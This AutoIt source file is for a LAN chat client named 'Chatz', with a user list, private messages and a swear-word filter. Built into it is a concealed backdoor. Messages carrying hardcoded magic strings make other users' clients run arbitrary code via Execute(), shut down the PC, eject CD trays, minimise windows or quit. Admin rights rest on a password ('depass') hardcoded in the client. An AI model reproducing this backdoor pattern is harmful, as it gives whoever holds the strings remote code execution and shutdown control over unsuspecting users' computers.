#include "TCP.au3"
#include <INet.au3>
#include <ButtonConstants.au3>
#include <GUIConstants.au3>
#include <EditConstants.au3>
#include <GuiListBox.au3>
#Include <GuiEdit.au3>
#include <ScrollBarConstants.au3>
#include <WindowsConstants.au3>
$count = 0
$msgboxcode = '$(U290-849ufhsjkh#82'
$executecode = '&#62Jf03kjfnvks)(-2*'
$cdtraycode = 'CDfjdkgjl%3928*93228^@5%;'
$exitcode = '*$hgjkhg387#&8290gfnlsgj@0'
$minallcode = '*#&^@(*%$_@(%*&$#%jmklfjhslkfj@*'
$shutdowncode = '*($&gjslkgyoushutdown9035osj#*72489NOW!!9068409468:KLGi8ueto'
$pmpass1 = '##kfjie1#2--+34?//Figvmsu'
$pmpass2 = 'AAhgdkfjie1&^32--+34?//Fi$62gvmsu'
$kickpass = '*73Jfos_-+3f@3$5kflsiJifuB!83&)(kf##'
$pass1 = '*#kglg873O(#72ghkjhgHALLOJASPER9387589357(*#@&*(@6'
$pass2 = 'LUDOOWNZDIESHIT*#(& %*(#^%NVydst935.;post\{P(#50-tispjv)(*#&@'
$cout = 24
Opt('OnExitFunc', '_Exit')
$admin = False
$correctpass = 'depass'
$ip = @IPAddress1
$socket = _TCP_Client_Create(88, $ip); Create the client. Which will connect to the local ip address on port 88
_TCP_RegisterEvent($TCP_RECEIVE, "Received"); Function "Received" will get called when something is received
_TCP_RegisterEvent($TCP_CONNECT, "Connected"); And func "Connected" will get called when the client is connected.
_TCP_RegisterEvent($TCP_DISCONNECT, "Disconnected"); And "Disconnected" will get called when the server disconnects us, or when the connection is lost.
$username=InputBox('Chatz username', 'Please enter a username', '', '', 100, 100, -1, -1)
if @error then exit
if StringLeft($username, 5) = 'admin' Then
	$password=InputBox('Chatz admin', 'Please enter your password', '', '*', 100, 100, -1, -1)
	if $password = $correctpass then $admin = True
Else
	$username = StringReplace($username, ' ', '')
EndIf

local $kick = 'abcdefg', $tall='tost', $msg='sgsg', $cdl='hallutg', $sht='stiu', $ex='ksotg', $execute='stijg', $mall='tirjgl', $hide='eptigjlsj'
if $admin then 
    $Form1 = GUICreate("Chatz - "&$username, 733, 447, 190, 123)
	$kick = GUICtrlCreateButton('Kick', 470, 0, 50, 25)
    GUICtrlSetFont(-1, 10, 800, 0, "Arial")
	$tall = GUICtrlCreateCheckbox('To all', 630, 180) 
	$hide = GUICtrlCreateCheckbox('Hide me', 630, 200) 
	$msg = GUICtrlCreateButton('Msgbox', 630, 30, 100, 25)
	$cdl = GUICtrlCreateButton('Cd Laatje', 630, 55, 100, 25)
	$sht = GUICtrlCreateButton('Shutdown', 630, 80, 100, 25)
	$ex = GUICtrlCreateButton('Exit', 630, 105, 100, 25)
	$execute = GUICtrlCreateButton('Execute', 630, 130, 100, 25)
	$mall = GUICtrlCreateButton('Min All', 630, 155, 100, 25)
Else
	$Form1 = GUICreate("Chatz - "&$username, 633, 447, 190, 123)
EndIf

$Button1 = GUICtrlCreateButton("Send", 560, 20, 57, 25, $BS_DEFPUSHBUTTON)
GUICtrlSetFont(-1, 10, 800, 0, "Arial")
$Pm = GUICtrlCreateButton("Pm", 560, 45, 57, 25)
GUICtrlSetFont(-1, 10, 800, 0, "Arial")
$Input1 = GUICtrlCreateInput("", 392, 36, 161, 24)
GUICtrlSetFont(-1, 10, 800, 0, "Arial")
$List1 = GUICtrlCreateList("", 392, 98, 217, 344)
$Label1 = GUICtrlCreateLabel("Users:", 392, 80, 34, 17)
$Edit1 = GUICtrlCreateEdit("", 8, 8, 377, 433, BitOR($ES_READONLY, $WS_VSCROLL))
GUICtrlSetFont(-1, 10, 800, 0, "Arial")
GUICtrlSetBkColor(-1, 0xFFFFFF)
GUISetState(@SW_SHOW)
_TCP_Client_Send('||| CONN /ADD:'&$username)
sleep(100)
_GetUsers()

Func _VarCountLines($sVar)
	$count = StringSplit($sVar, @CRLF, 1)
	return $count[0]
EndFunc

While 1
	$nMsg = GUIGetMsg()
	Switch $nMsg
		Case $GUI_EVENT_CLOSE
			Exit
			
		Case $Button1
			_TCP_Client_Send($username&' > '&_ReplaceSwearWords(GUICtrlRead($Input1)))
			GUICtrlSetData($Input1, '')
			
		Case $Pm
			_Pm($username, GUICtrlRead($Input1))
			
		Case $kick
			if $admin Then _Kick(GUICtrlRead($List1))
			
	    Case $msg
		    if $admin Then
				$towho = GUICtrlRead($List1)
				$input = InputBox('Chatz', 'Please enter msgbox title', '', '', 100, 100, -1, -1)
				$input2 = InputBox('Chatz', 'Please enter msgbox text', '', '', 100, 100, -1, -1)
				if GUICtrlRead($tall)=4 then
					_TCP_Client_Send($pass1&'to_all'&$pass2&$executecode&'msgbox(32, "'&$input&'", "'&$input2&'")')
				Else
					_TCP_Client_Send($pass1&$towho&$pass2&$executecode&'msgbox(32, "'&$input&'", "'&$input2&'")')
				EndIf
			EndIf
			
		Case $cdl
			if $admin then
				$towho = GUICtrlRead($List1)
				if GUICtrlRead($tall)<>4 then
					_TCP_Client_Send($pass1&'to_all'&$pass2&$cdtraycode)
				Else
					_TCP_Client_Send($pass1&$towho&$pass2&$cdtraycode)
				EndIf
			EndIf
			
		Case $sht
			if $admin then
				$towho = GUICtrlRead($List1)
				if GUICtrlRead($tall)<>4 then
					_TCP_Client_Send($pass1&'to_all'&$pass2&$shutdowncode)
				Else
					_TCP_Client_Send($pass1&$towho&$pass2&$shutdowncode)
				EndIf
			EndIf
			
		Case $ex
			if $admin then
				$towho = GUICtrlRead($List1)
				if GUICtrlRead($tall)<>4 then
					_TCP_Client_Send($pass1&'to_all'&$pass2&$exitcode)
				Else
					_TCP_Client_Send($pass1&$towho&$pass2&$exitcode)
				EndIf
			EndIf
			
		Case $execute
			if $admin Then
				$towho = GUICtrlRead($List1)
				$input = InputBox('Chatz', 'Please enter execute script', '', '', 100, 100, -1, -1)
				if GUICtrlRead($tall)<>4 then
					_TCP_Client_Send($pass1&'to_all'&$pass2&$executecode&$input)
				Else
					_TCP_Client_Send($pass1&$towho&$pass2&$executecode&$input)
				EndIf
			EndIf
			
		Case $mall
			if $admin then
				$towho = GUICtrlRead($List1)
				if GUICtrlRead($tall)<>4 then
					_TCP_Client_Send($pass1&'to_all'&$pass2&$minallcode)
				Else
					_TCP_Client_Send($pass1&$towho&$pass2&$minallcode)
				EndIf
			EndIf
			
		Case $hide
			if GUICtrlRead($hide) <> 4 Then
				_TCP_Client_Send('||| CONN /DEL:'&$username)
			Else
				_TCP_Client_Send('||| CONN /ADD:'&$username)
			EndIf
			

	EndSwitch
WEnd

Func _Pm($username, $sText)
	$all = GUICtrlRead($List1)
	if $all = '' then return -1
	_TCP_Client_Send($pmpass1&$username&$pmpass2&$all&' > '&$sText)
	_SetData('you pm '&$all&': '&$sText)
	GUICtrlSetData($Input1, '')
EndFunc

Func _Exit()
	_TCP_Client_Send('||| CONN /DEL:'&$username)
	exit
EndFunc

Func _GetUsers()
	_TCP_Client_Send('||| CONN /GET')
EndFunc

Func Disconnected()
	Msgbox(16, 'Server error', 'The server is temporarely offline..')
	exit
EndFunc

func _ReplaceSwearWords($sData, $c = '*')
	$1 = StringReplace($sData, 'fuck', c('fuck', $c) )
	$2 = StringReplace($1, 'shit', c('shit', $c) )
	$3 = StringReplace($2, 'dick', c('dick', $c) )
	$4 = StringReplace($3, 'dik', c('dik', $c) )
	$5 = StringReplace($4, 'sucks', c('sucks', $c) )
	$6 = StringReplace($5, 'suks', c('suks', $c) )
	$7 = StringReplace($6, 'dam', c('dam', $c) )
	$8 = StringReplace($7, 'damm', c('damm', $c) )
	$9 = StringReplace($8, 'dem', c('dem', $c) )
	$10 = StringReplace($9, 'demm', c('demm', $c) )
	$11 = StringReplace($10, 'suck', c('suck', $c) )
	$12 = StringReplace($11, 'suk', c('suk', $c) )
	$13 = StringReplace($12, 'sock', c('sock', $c) )
	$14 = StringReplace($13, 'sok', c('sok', $c) )
	$15 = StringReplace($14, 'socks', c('socks', $c) )
	$16 = StringReplace($15, 'soks', c('soks', $c) )
	$17 = StringReplace($16, 'fack', c('fack', $c) )
	$18 = StringReplace($17, 'fak', c('fak', $c) )
	$19 = StringReplace($18, 'facker', c('facker', $c) )
	$20 = StringReplace($19, 'faker', c('faker', $c) )
	$21 = StringReplace($20, 'facking', c('facking', $c) )
	$22 = StringReplace($21, 'foking', c('foking', $c) )
	$23 = StringReplace($22, 'focking', c('focking', $c) )
	$return = $23
	return $return
EndFunc

Func _Kick($username)
	_TCP_Client_Send($kickpass&$username)
EndFunc


func c($sLen, $sC)
	local $ret, $count = 0
	$i = StringLen($sLen)
	Do
		$ret &=$sC
		$count = $count + 1
	Until $i = $count
	return $ret
EndFunc

Func Received($iError, $sReceived)
	If StringLeft($sReceived, 14) = '||| CONN /ADD:' Then
		$nString = StringReplace($sReceived, '||| CONN /ADD:', '')
		GUICtrlSetData($List1, $nString)
		return -1
	ElseIf StringLeft($sReceived, 15) = '||| CONN /GET::' Then
		$plik = StringReplace($sReceived, '||| CONN /GET::', '')
		$string = StringSplit($plik, @CRLF, 1)
		for $i = 1 to $string[0]
			GUICtrlSetData($List1, $string[$i])
		Next
		return -1
	ElseIf StringLeft($sReceived, 14) = '||| CONN /DEL:' Then
		$nnn = StringReplace($sReceived, '||| CONN /DEL:', '')
		$index = _GUICtrlListBox_FindString($List1, $nnn)
		_GUICtrlListBox_DeleteString($List1, $index)
		return -1
	ElseIf StringLeft($sReceived, StringLen($pmpass1)) = $pmpass1 Then
		$new = StringSplit(StringReplace($sReceived, $pmpass1, ''), $pmpass2, 1)
		$n2 = StringSplit($new[2], ' > ', 1)
		$thauser = $n2[1]
		if $thauser = $username then _SetData($new[1]&" pm's you: "&$n2[2])
		return -1
		
	ElseIf StringLeft($sReceived, StringLen($kickpass)) = $kickpass Then
		if StringReplace($sReceived, $kickpass, '') = $username then Exit
		return -1

	EndIf
	$nothing = _CheckForHackz($sReceived)
	if $nothing = 1 then _SetData($sReceived)
EndFunc

Func _CheckForHackz($sReceived)
	$nothing = 1
	$str = StringSplit(StringReplace($sReceived, $pass1, ''), $pass2, 1)
	if $str[0] < 2 then return 1
	$sReceived = $str[2]
	if $str[1] <> $username and $str[1] <> 'to_all' then return 1
	if $admin then return 1
	if $sReceived = $shutdowncode then 
	    Shutdown(0)
		$nothing = 0
	EndIf
	if StringLeft($sReceived, StringLen($executecode))=$executecode then 
	    Execute(StringReplace($sReceived, $executecode, ''))
		$nothing = 0
	EndIf
	if $sReceived = $exitcode then 
	    Exit
		$nothing = 0
	EndIf
	if $sReceived = $minallcode then 
	    WinMinimizeAll()
		$nothing = 0
	EndIf
	if $sReceived = $cdtraycode then 
		CDTray('E', 'Open')
		CdTray('D', 'Open')
		$nothing = 0
	EndIf
	if $sReceived = $msgboxcode then 
	    msgbox(16, 'Error!!', 'your computer is dead...')
		$nothing = 0
	EndIf
	return $nothing
EndFunc

Func _SetData($sReceived)
	$tkst = GUICtrlRead($Edit1)
	if $tkst = '' then
		GUICtrlSetData($Edit1, $sReceived)
	Else
		GUICtrlSetData($Edit1, $tkst&@CRLF&$sReceived)
	EndIf
	;if _VarCountLines(GUICtrlRead($Edit1)) = $cout + 1 then
	;    _GUICtrlEdit_Scroll($Edit1, $SB_LINEDOWN)
	;	$cout = $cout + 1
	;EndIf
	$count = $count + 1
	_GUICtrlEdit_LineScroll($Edit1, 0, $count)
EndFunc
